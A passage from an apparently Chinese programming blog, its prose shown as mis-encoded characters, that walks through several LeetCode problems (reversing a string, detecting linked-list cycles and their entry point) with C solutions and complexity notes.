title="æ—¶é—´å¤æ‚åº¦ï¼š"></a>æ—¶é—´å¤æ‚åº¦ï¼š</h4><p>æœ€åæƒ…å†µä¸‹ä¸¤è¶Ÿå®Œæ•´éå†ï¼Œæœ€å¥½æƒ…å†µä¸‹éå†ä¸€è¶Ÿï¼Œæ—¶é—´å¤æ‚åº¦ä¸º<strong>O</strong>(<strong>N</strong>)</p><h4 id="ç©ºé—´å¤æ‚åº¦ï¼š-6"><a href="#ç©ºé—´å¤æ‚åº¦ï¼š-6" class="headerlink" title="ç©ºé—´å¤æ‚åº¦ï¼š"></a>ç©ºé—´å¤æ‚åº¦ï¼š</h4><p>åªéœ€è¦å¸¸æ•°çº§åˆ«çš„é¢å¤–ç©ºé—´ï¼Œæ•…ç©ºé—´å¤æ‚åº¦ä¸º<strong>O</strong>(<strong>1</strong>)</p><p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sortColors</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> temp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;numsSize;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;numsSize;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] &lt; nums[j])</span><br><span class="line">            &#123;</span><br><span class="line">                temp = nums[i];</span><br><span class="line">                nums[i] = nums[j];</span><br><span class="line">                nums[j] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/07/MEFrixChODK4c1n.png" alt="IF_F__@A8_F7PD_X_RFR8AA.png"></p><h3 id="8-344-åè½¬å­—ç¬¦ä¸²ï¼ˆç®€å•ï¼‰"><a href="#8-344-åè½¬å­—ç¬¦ä¸²ï¼ˆç®€å•ï¼‰" class="headerlink" title="8 - 344. åè½¬å­—ç¬¦ä¸²ï¼ˆç®€å•ï¼‰"></a>8 - <a href="https://leetcode-cn.com/problems/reverse-string/">344. åè½¬å­—ç¬¦ä¸²ï¼ˆç®€å•ï¼‰</a></h3><blockquote><p>ç¼–å†™ä¸€ä¸ªå‡½æ•°ï¼Œå…¶ä½œç”¨æ˜¯å°†è¾“å…¥çš„å­—ç¬¦ä¸²åè½¬è¿‡æ¥ã€‚è¾“å…¥å­—ç¬¦ä¸²ä»¥å­—ç¬¦æ•°ç»„ char[] çš„å½¢å¼ç»™å‡ºã€‚</p><p>ä¸è¦ç»™å¦å¤–çš„æ•°ç»„åˆ†é…é¢å¤–çš„ç©ºé—´ï¼Œä½ å¿…é¡»åŸåœ°ä¿®æ”¹è¾“å…¥æ•°ç»„ã€ä½¿ç”¨ O(1) çš„é¢å¤–ç©ºé—´è§£å†³è¿™ä¸€é—®é¢˜ã€‚</p><p>ä½ å¯ä»¥å‡è®¾æ•°ç»„ä¸­çš„æ‰€æœ‰å­—ç¬¦éƒ½æ˜¯ ASCII ç è¡¨ä¸­çš„å¯æ‰“å°å­—ç¬¦ã€‚</p><p>ç¤ºä¾‹ 1ï¼š</p><p>è¾“å…¥ï¼š[â€œhâ€,â€eâ€,â€lâ€,â€lâ€,â€oâ€]<br>è¾“å‡ºï¼š[â€œoâ€,â€lâ€,â€lâ€,â€eâ€,â€hâ€]<br>ç¤ºä¾‹ 2ï¼š</p><p>è¾“å…¥ï¼š[â€œHâ€,â€aâ€,â€nâ€,â€nâ€,â€aâ€,â€hâ€]<br>è¾“å‡ºï¼š[â€œhâ€,â€aâ€,â€nâ€,â€nâ€,â€aâ€,â€Hâ€]</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/reverse-string">https://leetcode-cn.com/problems/reverse-string</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><p>åŸåœ°äº¤æ¢å³å¯</p><p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">reverseString</span><span class="params">(<span class="type">char</span>* s, <span class="type">int</span> sSize)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> temp;</span><br><span class="line">    <span class="type">int</span> len = sSize/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        temp=s[i];</span><br><span class="line">        s[i]=s[sSize-i<span class="number">-1</span>];</span><br><span class="line">        s[sSize-i<span class="number">-1</span>]=temp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/08/EzXUN93shxaOjVn.png" alt="image.png"></p><h3 id="9-141-ç¯å½¢é“¾è¡¨ï¼ˆç®€å•ï¼‰"><a href="#9-141-ç¯å½¢é“¾è¡¨ï¼ˆç®€å•ï¼‰" class="headerlink" title="9 - 141. ç¯å½¢é“¾è¡¨ï¼ˆç®€å•ï¼‰"></a>9 - <a href="https://leetcode-cn.com/problems/linked-list-cycle/">141. ç¯å½¢é“¾è¡¨ï¼ˆç®€å•ï¼‰</a></h3><blockquote><p>ç»™å®šä¸€ä¸ªé“¾è¡¨ï¼Œåˆ¤æ–­é“¾è¡¨ä¸­æ˜¯å¦æœ‰ç¯ã€‚</p><p>å¦‚æœé“¾è¡¨ä¸­æœ‰æŸä¸ªèŠ‚ç‚¹ï¼Œå¯ä»¥é€šè¿‡è¿ç»­è·Ÿè¸ª next æŒ‡é’ˆå†æ¬¡åˆ°è¾¾ï¼Œåˆ™é“¾è¡¨ä¸­å­˜åœ¨ç¯ã€‚ ä¸ºäº†è¡¨ç¤ºç»™å®šé“¾è¡¨ä¸­çš„ç¯ï¼Œæˆ‘ä»¬ä½¿ç”¨æ•´æ•° pos æ¥è¡¨ç¤ºé“¾è¡¨å°¾è¿æ¥åˆ°é“¾è¡¨ä¸­çš„ä½ç½®ï¼ˆç´¢å¼•ä» 0 å¼€å§‹ï¼‰ã€‚ å¦‚æœ pos æ˜¯ -1ï¼Œåˆ™åœ¨è¯¥é“¾è¡¨ä¸­æ²¡æœ‰ç¯ã€‚æ³¨æ„ï¼špos ä¸ä½œä¸ºå‚æ•°è¿›è¡Œä¼ é€’ï¼Œä»…ä»…æ˜¯ä¸ºäº†æ ‡è¯†é“¾è¡¨çš„å®é™…æƒ…å†µã€‚</p><p>å¦‚æœé“¾è¡¨ä¸­å­˜åœ¨ç¯ï¼Œåˆ™è¿”å› true ã€‚ å¦åˆ™ï¼Œè¿”å› false ã€‚</p><p>è¿›é˜¶ï¼š</p><p>ä½ èƒ½ç”¨ O(1)ï¼ˆå³ï¼Œå¸¸é‡ï¼‰å†…å­˜è§£å†³æ­¤é—®é¢˜å—ï¼Ÿ</p><p>ç¤ºä¾‹ 1ï¼š</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist.png" alt="image.png"></p><p>è¾“å…¥ï¼šhead &#x3D; [3,2,0,-4], pos &#x3D; 1<br>è¾“å‡ºï¼štrue<br>è§£é‡Šï¼šé“¾è¡¨ä¸­æœ‰ä¸€ä¸ªç¯ï¼Œå…¶å°¾éƒ¨è¿æ¥åˆ°ç¬¬äºŒä¸ªèŠ‚ç‚¹ã€‚<br>ç¤ºä¾‹ 2ï¼š</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist_test2.png" alt="image.png"></p><p>è¾“å…¥ï¼šhead &#x3D; [1,2], pos &#x3D; 0<br>è¾“å‡ºï¼štrue<br>è§£é‡Šï¼šé“¾è¡¨ä¸­æœ‰ä¸€ä¸ªç¯ï¼Œå…¶å°¾éƒ¨è¿æ¥åˆ°ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ã€‚<br>ç¤ºä¾‹ 3ï¼š</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist_test3.png" alt="image.png"></p><p>è¾“å…¥ï¼šhead &#x3D; [1], pos &#x3D; -1<br>è¾“å‡ºï¼šfalse<br>è§£é‡Šï¼šé“¾è¡¨ä¸­æ²¡æœ‰ç¯ã€‚</p><p>æç¤ºï¼š</p><p>é“¾è¡¨ä¸­èŠ‚ç‚¹çš„æ•°ç›®èŒƒå›´æ˜¯ [0, 104]<br>-105 &lt;&#x3D; Node.val &lt;&#x3D; 105<br>pos ä¸º -1 æˆ–è€…é“¾è¡¨ä¸­çš„ä¸€ä¸ª æœ‰æ•ˆç´¢å¼• ã€‚</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/linked-list-cycle">https://leetcode-cn.com/problems/linked-list-cycle</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><h4 id="è§£æ³•ä¸€ï¼šå¿«æ…¢æŒ‡é’ˆ"><a href="#è§£æ³•ä¸€ï¼šå¿«æ…¢æŒ‡é’ˆ" class="headerlink" title="è§£æ³•ä¸€ï¼šå¿«æ…¢æŒ‡é’ˆ"></a>è§£æ³•ä¸€ï¼šå¿«æ…¢æŒ‡é’ˆ</h4><p>è€å¿«æ…¢æŒ‡é’ˆäººäº†ï¼Œ<strong>åªè¦é“¾è¡¨ä¸­å­˜åœ¨ç¯é‚£ä¹ˆåœ¨éå†è¿‡ç¨‹ä¸­æ­¥é•¿ä¸ä¸€çš„å¿«æ…¢æŒ‡é’ˆè‚¯å®šä¼šç›¸é‡</strong></p><p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">hasCycle</span><span class="params">(<span class="keyword">struct</span> ListNode *head)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!head)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">ptr1</span> =</span> head, *ptr2 = head-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(ptr1 &amp;&amp; ptr2)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(ptr1 == ptr2)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        ptr1 = ptr1-&gt;next;</span><br><span class="line">        ptr2 = ptr2-&gt;next;</span><br><span class="line">        <span class="keyword">if</span>(!ptr2)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        ptr2 = ptr2-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/09/PtGJv5EIz3RgAWd.png" alt="image.png"></p><h4 id="è§£æ³•äºŒï¼šåˆ©ç”¨é¢˜ç›®æ•°æ®èŒƒå›´æ¼æ´"><a href="#è§£æ³•äºŒï¼šåˆ©ç”¨é¢˜ç›®æ•°æ®èŒƒå›´æ¼æ´" class="headerlink" title="è§£æ³•äºŒï¼šåˆ©ç”¨é¢˜ç›®æ•°æ®èŒƒå›´æ¼æ´"></a>è§£æ³•äºŒï¼šåˆ©ç”¨é¢˜ç›®æ•°æ®èŒƒå›´æ¼æ´</h4><p>é¢˜ç›®ä¿è¯ç»“ç‚¹æ•°é‡å°äº10000ï¼Œé‚£ä¹ˆ<strong>åªè¦éå†èƒ½å¾ªç¯è¶…è¿‡10000æ¬¡ï¼Œé“¾è¡¨ä¸­å°±å¿…å®šå­˜åœ¨å›è·¯</strong></p><p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">hasCycle</span><span class="params">(<span class="keyword">struct</span> ListNode *head)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(head)</span><br><span class="line">    &#123;</span><br><span class="line">        head = head-&gt;next;</span><br><span class="line">        n++;</span><br><span class="line">        <span class="keyword">if</span>(n &gt; <span class="number">10000</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/23/wXfJ6e.png" alt="wXfJ6e.png"></p><h3 id="10-142-ç¯å½¢é“¾è¡¨-IIï¼ˆä¸­ç­‰ï¼‰"><a href="#10-142-ç¯å½¢é“¾è¡¨-IIï¼ˆä¸­ç­‰ï¼‰" class="headerlink" title="10 - 142. ç¯å½¢é“¾è¡¨ IIï¼ˆä¸­ç­‰ï¼‰"></a>10 - <a href="https://leetcode-cn.com/problems/linked-list-cycle-ii/">142. ç¯å½¢é“¾è¡¨ IIï¼ˆä¸­ç­‰ï¼‰</a></h3><blockquote><p>ç»™å®šä¸€ä¸ªé“¾è¡¨ï¼Œè¿”å›é“¾è¡¨å¼€å§‹å…¥ç¯çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ã€‚ å¦‚æœé“¾è¡¨æ— ç¯ï¼Œåˆ™è¿”å› nullã€‚</p><p>ä¸ºäº†è¡¨ç¤ºç»™å®šé“¾è¡¨ä¸­çš„ç¯ï¼Œæˆ‘ä»¬ä½¿ç”¨æ•´æ•° pos æ¥è¡¨ç¤ºé“¾è¡¨å°¾è¿æ¥åˆ°é“¾è¡¨ä¸­çš„ä½ç½®ï¼ˆç´¢å¼•ä» 0 å¼€å§‹ï¼‰ã€‚ å¦‚æœ pos æ˜¯ -1ï¼Œåˆ™åœ¨è¯¥é“¾è¡¨ä¸­æ²¡æœ‰ç¯ã€‚</p><p>è¯´æ˜ï¼šä¸å…è®¸ä¿®æ”¹ç»™å®šçš„é“¾è¡¨ã€‚</p><p>ç¤ºä¾‹ 1ï¼š</p><p>è¾“å…¥ï¼šhead &#x3D; [3,2,0,-4], pos &#x3D; 1<br>è¾“å‡ºï¼štail connects to node index 1<br>è§£é‡Šï¼šé“¾è¡¨ä¸­æœ‰ä¸€ä¸ªç¯ï¼Œå…¶å°¾éƒ¨è¿æ¥åˆ°ç¬¬äºŒä¸ªèŠ‚ç‚¹ã€‚</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist.png" alt="image.png"></p><p>ç¤ºä¾‹ 2ï¼š</p><p>è¾“å…¥ï¼šhead &#x3D; [1,2], pos &#x3D; 0<br>è¾“å‡ºï¼štail connects to node index 0<br>è§£é‡Šï¼šé“¾è¡¨ä¸­æœ‰ä¸€ä¸ªç¯ï¼Œå…¶å°¾éƒ¨è¿æ¥åˆ°ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ã€‚</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist_test2.png" alt="image.png"></p><p>ç¤ºä¾‹ 3ï¼š</p><p>è¾“å…¥ï¼šhead &#x3D; [1], pos &#x3D; -1<br>è¾“å‡ºï¼šno cycle<br>è§£é‡Šï¼šé“¾è¡¨ä¸­æ²¡æœ‰ç¯ã€‚</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist_test3.png" alt="image.png"></p><p>è¿›é˜¶ï¼š<br>ä½ æ˜¯å¦å¯ä»¥ä¸ç”¨é¢å¤–ç©ºé—´è§£å†³æ­¤é¢˜ï¼Ÿ</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/linked-list-cycle-ii">https://leetcode-cn.com/problems/linked-list-cycle-ii</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><h4 id="è§£æ³•ä¸€ï¼šå“ˆå¸Œè¡¨"><a href="#è§£æ³•ä¸€ï¼šå“ˆå¸Œè¡¨" class="headerlink" title="è§£æ³•ä¸€ï¼šå“ˆå¸Œè¡¨"></a>è§£æ³•ä¸€ï¼šå“ˆå¸Œè¡¨</h4><p>ç”¨ä¸€ä¸ªè¡¨æ”¶é›†å·²ç»éå†è¿‡çš„ç»“ç‚¹ï¼Œæ¯éå†è¿‡ä¸€ä¸ªç»“ç‚¹çœ‹è¿™ä¸ªç»“ç‚¹æ˜¯å¦åœ¨è¡¨å†…å³å¯</p><p>å½“ç„¶ï¼Œæ¯æ¬¡éƒ½è¦åœ¨è¡¨å†…å¯»æ‰¾ç»“ç‚¹ï¼Œæ—¶é—´å¤æ‚åº¦æœ€åæ˜¯<strong>O</strong>(<strong>N^2</strong>)</p><p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> ListNode *<span class="title function_">detectCycle</span><span class="params">(<span class="keyword">struct</span> ListNode *head)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!head || !head-&gt;next)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">map</span>[10000];</span></span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(head)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;index;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(head == <span class="built_in">map</span>[i])</span><br><span class="line">                <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">map</span>[index++] = head;</span><br><span class="line">        head = head-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>è¿è¡Œæ—¶é—´ååˆ†æƒ¨ä¸å¿ç¹</p></blockquote><p><img src="https://i.loli.net/2020/10/10/9kICpfDBudOlQUF.png" alt="image.png"></p><h4 id="è§£æ³•äºŒï¼šå¿«æ…¢æŒ‡é’ˆ"><a href="#è§£æ³•äºŒï¼šå¿«æ…¢æŒ‡é’ˆ" class="headerlink" title="è§£æ³•äºŒï¼šå¿«æ…¢æŒ‡é’ˆ"></a>è§£æ³•äºŒï¼šå¿«æ…¢æŒ‡é’ˆ</h4><p>æˆ‘ä»¬å¯ä»¥ç”¨æ­¥é•¿åˆ†åˆ«ä¸º1ã€2çš„ä¸¤ä¸ªæŒ‡é’ˆéå†è¯¥é“¾è¡¨ï¼Œæ€è€ƒå¦‚ä¸‹äº‹å®ï¼š</p><p><img src="https://i.loli.net/2020/10/10/Mo8YQgWPSTHKRwD.png" alt="BFACBC2D2E0D388B926508F2A850E287.png"></p><p>å½“å¿«æ…¢æŒ‡é’ˆç›¸é‡åï¼Œ<strong>æ…¢æŒ‡é’ˆä»ç¯çš„èµ·å§‹ç‚¹èµ°äº†è·ç¦»b</strong>ï¼Œè‹¥æ˜¯ä»è¯¥æ—¶åˆ»å¼€å§‹æœ‰ä¸€ä¸ªæŒ‡é’ˆä»é“¾è¡¨å¤´ä¸æ…¢æŒ‡é’ˆåŒæ­¥é•¿éå†ï¼Œå½“ä¸¤æŒ‡é’ˆç›¸é‡æ—¶ï¼Œä¸¤ä¸ªæŒ‡é’ˆåˆ†åˆ«éƒ½èµ°äº†è·ç¦»aï¼Œ<strong>æ­¤æ—¶æ…¢æŒ‡é’ˆæ€»å…±ä»ç¯çš„èµ·å§‹ç‚¹èµ°äº†a+b &#x3D; n*b + n*c çš„è·ç¦»ï¼Œåˆšå¥½å›åˆ°èµ·å§‹ç‚¹</strong>ï¼Œè¿™æ ·æˆ‘ä»¬å°±æ‰¾åˆ°ç¯çš„èµ·å§‹ç‚¹äº†</p><p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ListNode</span> *<span class="built_in">detectCycle</span>(<span class="keyword">struct</span> ListNode *head) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!head || !head-&gt;next)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">ListNode</span> * slow_ptr = head, *fast_ptr = head-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(slow_ptr &amp;&amp; fast_ptr)</span><br><span class="line">    &#123;</span><br><span class="line">        slow_ptr = slow_ptr-&gt;next;</span><br><span class="line">        fast_ptr = fast_ptr-&gt;next;</span><br><span class="line">        <span class="keyword">if</span>(!fast_ptr)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        fast_ptr = fast_ptr-&gt;next;</span><br><span class="line">        <span class="keyword">if</span>(slow_ptr == fast_ptr)</span><br><span class="line">        &#123;</span><br><span class="line">            slow_ptr = slow_ptr-&gt;next;</span><br><span class="line">            <span class="keyword">struct</span> <span class="title class_">ListNode</span> * ptr = head;</span><br><span class="line">            <span class="keyword">while</span>(ptr != slow_ptr)</span><br><span class="line">            &#123;</span><br><span class="line">                ptr = ptr-&gt;next;</span><br><span class="line">                slow_ptr = slow_ptr-&gt;next;                </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ptr;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/10/YJ9p1S3ryl6jkuM.png" alt="_3E__5BJH58~HSP__SZ_ZD5.png"></p><h3 id="11-416-åˆ†å‰²ç­‰å’Œå­é›†ï¼ˆä¸­ç­‰ï¼‰"><a href="#11-416-åˆ†å‰²ç­‰å’Œå­é›†ï¼ˆä¸­ç­‰ï¼‰" class="headerlink" title="11 - 416. åˆ†å‰²ç­‰å’Œå­é›†ï¼ˆä¸­ç­‰ï¼‰"></a>11 - <a href="https://leetcode-cn.com/problems/partition-equal-subset-sum/">416. åˆ†å‰²ç­‰å’Œå­é›†ï¼ˆä¸­ç­‰ï¼‰</a></h3><blockquote><p>ç»™å®šä¸€ä¸ªåªåŒ…å«æ­£æ•´æ•°çš„éç©ºæ•°ç»„ã€‚æ˜¯å¦å¯ä»¥å°†è¿™ä¸ªæ•°ç»„åˆ†å‰²æˆä¸¤ä¸ªå­é›†ï¼Œä½¿å¾—ä¸¤ä¸ªå­é›†çš„å…ƒç´ å’Œç›¸ç­‰ã€‚</p><p>æ³¨æ„:</p><p>æ¯ä¸ªæ•°ç»„ä¸­çš„å…ƒç´ ä¸ä¼šè¶…è¿‡ 100<br>æ•°ç»„çš„å¤§å°ä¸ä¼šè¶…è¿‡ 200<br>ç¤ºä¾‹ 1:</p><p>è¾“å…¥: [1, 5, 11, 5]</p><p>è¾“å‡º: true</p><p>è§£é‡Š: æ•°ç»„å¯ä»¥åˆ†å‰²æˆ [1, 5, 5] å’Œ [11].</p><p>ç¤ºä¾‹ 2:</p><p>è¾“å…¥: [1, 2, 3, 5]</p><p>è¾“å‡º: false</p><p>è§£é‡Š: æ•°ç»„ä¸èƒ½åˆ†å‰²æˆä¸¤ä¸ªå…ƒç´ å’Œç›¸ç­‰çš„å­é›†.</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a 